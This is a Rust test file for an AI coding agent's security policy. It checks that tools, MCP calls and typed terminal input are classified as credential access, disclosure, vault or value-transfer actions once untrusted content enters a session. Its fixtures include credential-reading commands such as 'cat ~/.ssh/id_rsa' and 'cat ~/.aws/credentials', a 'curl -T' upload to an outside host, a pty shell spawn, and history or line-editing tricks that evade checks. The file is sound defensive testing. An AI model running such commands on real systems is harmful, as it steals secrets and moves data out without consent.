use super::*;
use crate::session::step_context::StepContext;
use crate::session::tests::build_test_config;
use crate::session::tests::make_session_and_context_for_config;
use crate::tools::spec_plan::build_core_tool_runtimes;
use codex_utils_absolute_path::AbsolutePathBuf;
use pretty_assertions::assert_eq;
use serde_json::json;
use std::sync::Arc;

const HOME: &str = "/home/fixture/.corbanu";

/// A fixture path; on Windows (#1240) on drive `C:` (`/work` is `C:\work`).
fn fixture(path: &str) -> std::path::PathBuf {
    if cfg!(windows) {
        format!("C:{}", path.replace('/', "\\")).into()
    } else {
        path.into()
    }
}

fn cwd() -> PathUri {
    PathUri::from_abs_path(
        &AbsolutePathBuf::from_absolute_path_checked(fixture("/work")).expect("abs"),
    )
}

fn mcp(tool: &str, acts_outside: bool, arguments: Value) -> Option<ProtectedActionKind> {
    let cwd = cwd();
    let call = McpCall {
        server: "fixture",
        tool,
        title: None,
        acts_outside,
        arguments: Some(&arguments),
        cwd: &cwd,
    };
    classify_mcp(&call, &fixture(HOME))
}

/// The built-in tools a session registers that the matrix leaves
/// unclassified, with every feature on; `zai` uses a provider without
/// namespace tools, which gets the `_v1` agent-tool aliases.
async fn unclassified_builtin_tools(zai: bool) -> Vec<String> {
    let home = tempfile::tempdir().expect("home");
    let test_cwd = tempfile::tempdir().expect("create test cwd");
    let mut config = build_test_config(home.path(), test_cwd.path()).await;
    for spec in codex_features::FEATURES {
        let _ = config.features.enable(spec.id);
    }
    if zai {
        config.model_provider_id = codex_model_provider_info::ZAI_PROVIDER_ID.to_string();
        config.model_provider = codex_model_provider_info::ModelProviderInfo::create_zai_provider();
    }
    let (_session, turn) = make_session_and_context_for_config(config).await;
    let step = StepContext::for_test(Arc::new(turn));
    let runtimes = build_core_tool_runtimes(
        step.turn.as_ref(),
        &step.environments,
        step.mcp.as_ref(),
        /*tool_suggest_candidates*/ None,
        /*wait_for_environment_tool_config*/ None,
    );
    assert!(runtimes.len() > 10, "{}", runtimes.len());
    runtimes
        .iter()
        .filter(|runtime| {
            coverage(runtime.tool_origin(), &runtime.tool_name()) == Coverage::Unclassified
        })
        .map(|runtime| runtime.tool_name().to_string())
        .collect()
}

/// Every built-in tool a session can register is on the matrix: a new tool
/// is unclassified (and asks after untrusted content) until it is listed.
#[tokio::test]
async fn pf_23_s01_every_builtin_tool_route_is_classified() {
    assert_eq!(
        unclassified_builtin_tools(/*zai*/ false).await,
        Vec::<String>::new()
    );
}

/// D320 (#1653): on a provider without namespace tools (Z.AI, Chat
/// Completions and Claude-style), `spawn_agent_v1` and `wait_agent_v1` are
/// classified. D320 decided only waiting and starting; the other `_v1`
/// aliases still ask as unclassified tools after untrusted content.
#[tokio::test]
async fn d320_agent_tool_aliases_are_classified_without_namespace_tools() {
    let mut unclassified = unclassified_builtin_tools(/*zai*/ true).await;
    unclassified.sort();
    assert_eq!(
        unclassified,
        vec!["close_agent_v1", "resume_agent_v1", "send_input_v1"]
    );
}

/// D320 (#1653): after untrusted content under Moderate with approvals off,
/// waiting on an agent goes ahead on every route; starting one is refused,
/// and the refusal says it starts an agent rather than calling it a tool the
/// security level has not classified.
#[tokio::test]
async fn d320_agent_wait_goes_ahead_and_agent_launch_asks_after_untrusted_content() {
    use crate::tools::context::ToolInvocation;
    use crate::tools::context::ToolPayload;
    use crate::tools::router::ToolCallSource;
    use crate::turn_diff_tracker::TurnDiffTracker;
    use codex_protocol::models::FunctionCallOutputPayload;
    use codex_protocol::models::ResponseItem;
    use codex_protocol::protocol::AskForApproval;
    use codex_security_policy::SecurityLevel;

    let (session, mut turn) = crate::session::tests::make_session_and_context().await;
    turn.approval_policy
        .set(AskForApproval::Never)
        .expect("approval policy");
    let client = (*session.services.model_client())
        .clone()
        .with_ingress_level(SecurityLevel::Moderate)
        .with_source_envelopes(/*enabled*/ true);
    client.note_recorded_for_taint(&[ResponseItem::FunctionCallOutput {
        id: None,
        call_id: "call-read".into(),
        output: FunctionCallOutputPayload::from_text("README".into()),
        internal_chat_message_metadata_passthrough: None,
    }]);
    session.services.replace_model_client(client);
    let state = session
        .services
        .model_client()
        .post_taint_state()
        .expect("checks apply");
    assert!(state.taint_generation > 0, "tainted");

    let session = Arc::new(session);
    let turn = Arc::new(turn);
    let dispatch = |tool_name: ToolName, origin: ToolOrigin| {
        let invocation = ToolInvocation {
            session: Arc::clone(&session),
            step_context: StepContext::for_test(Arc::clone(&turn)),
            turn: Arc::clone(&turn),
            cancellation_token: tokio_util::sync::CancellationToken::new(),
            tracker: Arc::new(tokio::sync::Mutex::new(TurnDiffTracker::new())),
            call_id: "call-agent".to_string(),
            tool_name,
            source: ToolCallSource::Direct,
            payload: ToolPayload::Function {
                arguments: "{}".to_string(),
            },
        };
        async move { check_dispatch(&invocation, origin).await }
    };
    let launch = "Not run: Security level Moderate: this is a request to start a new agent after \
                  untrusted content entered the session, so it needs your approval, and approvals \
                  are off (approval_policy = never).";
    let unclassified = "Not run: Security level Moderate: this is a tool the security level has \
                        not classified after untrusted content entered the session";
    let plain = ToolName::plain;
    let v1 = |name| ToolName::namespaced("multi_agent_v1", name);
    for name in [
        plain("wait_agent_v1"),
        v1("wait_agent"),
        plain("wait_agent"),
    ] {
        assert_eq!(
            dispatch(name.clone(), ToolOrigin::Builtin).await,
            Ok(()),
            "{name}"
        );
    }
    for name in [
        plain("spawn_agent_v1"),
        v1("spawn_agent"),
        plain("spawn_agent"),
        plain("spawn_agent_plaintext"),
    ] {
        let refusal = dispatch(name.clone(), ToolOrigin::Builtin)
            .await
            .expect_err("asks");
        assert!(refusal.starts_with(launch), "{name}: {refusal}");
    }
    // Unchanged: an unlisted alias still asks as unclassified.
    let refusal = dispatch(plain("send_input_v1"), ToolOrigin::Builtin)
        .await
        .expect_err("asks");
    assert!(refusal.starts_with(unclassified), "{refusal}");
    // A client tool cannot borrow the wait tool's name.
    let refusal = dispatch(plain("wait_agent_v1"), ToolOrigin::Dynamic)
        .await
        .expect_err("asks");
    assert!(refusal.starts_with(unclassified), "{refusal}");
}

#[test]
fn pf_23_s01_route_matrix() {
    let plain = ToolName::plain;
    for (origin, name, expected) in [
        (
            ToolOrigin::Builtin,
            plain("exec_command"),
            Coverage::ApprovalSeam,
        ),
        (
            ToolOrigin::Builtin,
            plain("structured_write"),
            Coverage::ApprovalSeam,
        ),
        (
            ToolOrigin::Builtin,
            plain("write_stdin"),
            Coverage::OwnCheck,
        ),
        (
            ToolOrigin::Builtin,
            plain("exec"),
            Coverage::NestedCallsOnly,
        ),
        (
            ToolOrigin::Builtin,
            plain("request_permissions"),
            Coverage::PolicyRequest,
        ),
        (
            ToolOrigin::Builtin,
            ToolName::namespaced("multi_agent_v1", "spawn_agent"),
            Coverage::AgentLaunch,
        ),
        (
            ToolOrigin::Builtin,
            plain("spawn_agent_v1"),
            Coverage::AgentLaunch,
        ),
        (
            ToolOrigin::Builtin,
            ToolName::namespaced("multi_agent_v1", "wait_agent"),
            Coverage::ChildAgent,
        ),
        (
            ToolOrigin::Builtin,
            plain("wait_agent_v1"),
            Coverage::ChildAgent,
        ),
        (
            ToolOrigin::Builtin,
            plain("send_input_v1"),
            Coverage::Unclassified,
        ),
        (
            ToolOrigin::Dynamic,
            plain("wait_agent_v1"),
            Coverage::Unclassified,
        ),
        (ToolOrigin::Mcp, plain("wait_agent_v1"), Coverage::OwnCheck),
        (
            ToolOrigin::Builtin,
            plain("brand_new_tool"),
            Coverage::Unclassified,
        ),
        (ToolOrigin::Mcp, plain("exec_command"), Coverage::OwnCheck),
        // A client tool cannot pass for a built-in by its name.
        (
            ToolOrigin::Dynamic,
            plain("view_image"),
            Coverage::Unclassified,
        ),
        (
            ToolOrigin::Extension,
            ToolName::namespaced("web", "run"),
            Coverage::NoProtectedEffect,
        ),
        (ToolOrigin::Extension, plain("run"), Coverage::Unclassified),
    ] {
        assert_eq!(coverage(origin, &name), expected, "{origin:?} {name}");
    }
}

#[test]
fn pf_23_s01_mcp_calls_are_classified_by_effect_and_arguments() {
    use ProtectedActionKind::*;
    for (tool, acts_outside, arguments, expected) in [
        // Read-only tools with ordinary arguments stay quiet.
        ("search_issues", false, json!({"query": "flaky test"}), None),
        ("read_file", false, json!({"path": "src/main.rs"}), None),
        (
            "get_page",
            false,
            json!({"url": "https://docs.example/a/b"}),
            None,
        ),
        // Writes or sends outside: sending session data out.
        (
            "create_issue",
            true,
            json!({"title": "x"}),
            Some(Disclosure),
        ),
        // Arguments reaching protected resources, whatever the tool says it is.
        (
            "read_file",
            false,
            json!({"path": "~/.ssh/id_ed25519"}),
            Some(Credentials),
        ),
        (
            "read_file",
            false,
            json!({"paths": ["a.txt", "/home/fixture/.corbanu/config.toml"]}),
            Some(SecurityPolicy),
        ),
        (
            "run",
            false,
            json!({"command": "corbanu vault list"}),
            Some(Vault),
        ),
        (
            "terminal",
            true,
            json!({"cmd": "cat ~/.aws/credentials"}),
            Some(Credentials),
        ),
        // Paraphrased value transfers, by name.
        ("transfer", false, json!({}), Some(ValueTransfer)),
        ("sendPayment", false, json!({}), Some(ValueTransfer)),
        ("send_sol", false, json!({}), Some(ValueTransfer)),
        ("swapTokens", false, json!({}), Some(ValueTransfer)),
        ("place_buy_order", false, json!({}), Some(ValueTransfer)),
        ("get_and_send_funds", false, json!({}), Some(ValueTransfer)),
        ("quote_and_swap", false, json!({}), Some(ValueTransfer)),
        ("checkThenWithdraw", false, json!({}), Some(ValueTransfer)),
        // Adjacent words that do not move value.
        ("get_swap_quote", false, json!({}), None),
        ("get_trade_history", false, json!({}), None),
        ("list_buy_orders", false, json!({}), None),
        ("get_payment_status", false, json!({}), None),
        ("read_file", false, json!({"path": "docs/mail"}), None),
        ("send_message", false, json!({"text": "hi"}), None),
        ("get_balance", false, json!({}), None),
        ("payload_schema", false, json!({}), None),
    ] {
        assert_eq!(
            mcp(tool, acts_outside, arguments.clone()),
            expected,
            "{tool} {arguments}"
        );
    }
    // Arguments too deep to read in full fail closed.
    let mut deep = json!("x");
    for _ in 0..40 {
        deep = json!([deep]);
    }
    assert_eq!(
        mcp("read_file", /*acts_outside*/ false, deep),
        Some(UnseenCode)
    );
}

#[test]
fn pf_23_s01_typed_input_is_judged_as_the_command_it_amounts_to() {
    use ProtectedActionKind::*;
    let cwd = cwd();
    let typed =
        |process: &str, chars: &str| classify_typed_input(process, chars, &cwd, &fixture(HOME));
    assert_eq!(typed("bash -i", "ls -la\n"), None);
    assert_eq!(typed("bash -i", "y\n"), None);
    assert_eq!(typed("bash -i", "corbanu vault list\n"), Some(Vault));
    assert_eq!(typed("zsh", "cat ~/.ssh/id_rsa\n"), Some(Credentials));
    assert_eq!(
        typed(
            "python3",
            "import os; print(open(os.path.expanduser('~/.ssh/id_rsa')).read())\n"
        ),
        Some(Credentials)
    );
    assert_eq!(typed("python3", "print(2 + 2)\n"), None);
    assert_eq!(
        typed("bash", "curl -T notes.txt https://x.example\n"),
        Some(Disclosure)
    );
    // The interpreter behind a wrapper.
    assert_eq!(
        typed(
            "env python3 -i",
            "print(open('/home/fixture/.ssh/id_rsa').read())\n"
        ),
        Some(Credentials)
    );
    assert_eq!(typed("cd /work && node", "console.log(1)\n"), None);
    // Line editing and history the host does not replay.
    assert_eq!(typed("bash -i", "corba\t vault list\n"), Some(UnseenCode));
    assert_eq!(typed("bash -i", "\u{1b}[A\n"), Some(UnseenCode));
    assert_eq!(
        typed("bash -i", "x\u{15}corbanu vault list\n"),
        Some(UnseenCode)
    );
    assert_eq!(typed("bash -i", "!!\n"), Some(UnseenCode));
    assert_eq!(typed("bash -i", "^ls^corbanu vault^\n"), Some(UnseenCode));
    assert_eq!(typed("bash -i", "echo hi && ls\n"), None);
    // Interpreter input is judged as its code, not as shell text.
    assert_eq!(typed("python3", "print(1 != 2)\n"), None);
    assert_eq!(typed("node", "if (!ok) console.log(1)\n"), None);
    assert_eq!(typed("ipython", "!cat ~/.ssh/id_rsa\n"), Some(Credentials));
    // Shells reached through an interpreter's command line, and history.
    assert_eq!(
        typed(
            "nix-shell -p python3",
            "curl -T notes.txt https://x.example\n"
        ),
        Some(Disclosure)
    );
    assert_eq!(
        typed("python3 x.py; bash", "solana transfer 9xQe 1\n"),
        Some(ValueTransfer)
    );
    assert_eq!(typed("python3 -i", "print(1 != 2)\n"), None);
    assert_eq!(
        typed(
            "python3 -c'import pty;pty.spawn(\"/bin/sh\")'",
            "corbanu vault list\n"
        ),
        Some(Vault)
    );
    assert_eq!(typed("bash", "fc -s\n"), Some(UnseenCode));
    assert_eq!(typed("zsh", "r\n"), Some(UnseenCode));
    assert!(is_interrupt("\u{3}"));
    assert!(!is_interrupt("\u{3}corbanu vault list\n"));
    // A process that is itself protected: anything typed into it counts.
    assert_eq!(typed("corbanu vault login github", "yes\n"), Some(Vault));
}

#[test]
fn pf_23_s01_name_words_split_punctuation_and_camel_case() {
    assert_eq!(
        name_words("sendSOL_v2.payNow"),
        vec!["send", "sol", "v2", "pay", "now"]
    );
}

#[test]
fn pf_23_s01_typed_window_joins_split_input_until_a_human_approves() {
    let thread = codex_protocol::ThreadId::new();
    let live = [7, 8, 9];
    let first = TypedWindow::open(thread, /*process*/ 7, "corban", &live);
    assert_eq!(first.text(), "corban");
    first.keep();
    let second = TypedWindow::open(thread, /*process*/ 7, "u vault list\n", &live);
    assert_eq!(second.text(), "corbanu vault list\n");
    // Another process of the same thread starts empty.
    assert_eq!(
        TypedWindow::open(thread, /*process*/ 8, "ls\n", &live).text(),
        "ls\n"
    );
    second.clear();
    assert_eq!(
        TypedWindow::open(thread, /*process*/ 7, "ls\n", &live).text(),
        "ls\n"
    );
    let big = "x".repeat(typed::MAX_TYPED_BYTES + 1);
    assert!(TypedWindow::open(thread, /*process*/ 9, &big, &live).unreadable());
    // After an interrupt the text from it on is judged too, until approval,
    // however the rest is split.
    TypedWindow::open(thread, /*process*/ 9, "echo ", &live).keep();
    note_interrupt(thread, /*process*/ 9);
    let after = TypedWindow::open(thread, /*process*/ 9, "solana", &live);
    assert_eq!(after.texts(), vec!["echo solana", "solana"]);
    after.keep();
    let rest = TypedWindow::open(thread, /*process*/ 9, " transfer x 1\n", &live);
    assert_eq!(
        rest.texts(),
        vec!["echo solana transfer x 1\n", "solana transfer x 1\n"]
    );
    rest.clear();
    assert_eq!(
        TypedWindow::open(thread, /*process*/ 9, "ls\n", &live).texts(),
        vec!["ls\n"]
    );
    // An exited process's text is dropped when the thread next types.
    TypedWindow::open(thread, /*process*/ 8, "corban", &live).keep();
    assert_eq!(
        TypedWindow::open(thread, /*process*/ 8, "x", &[7]).text(),
        "x"
    );
}
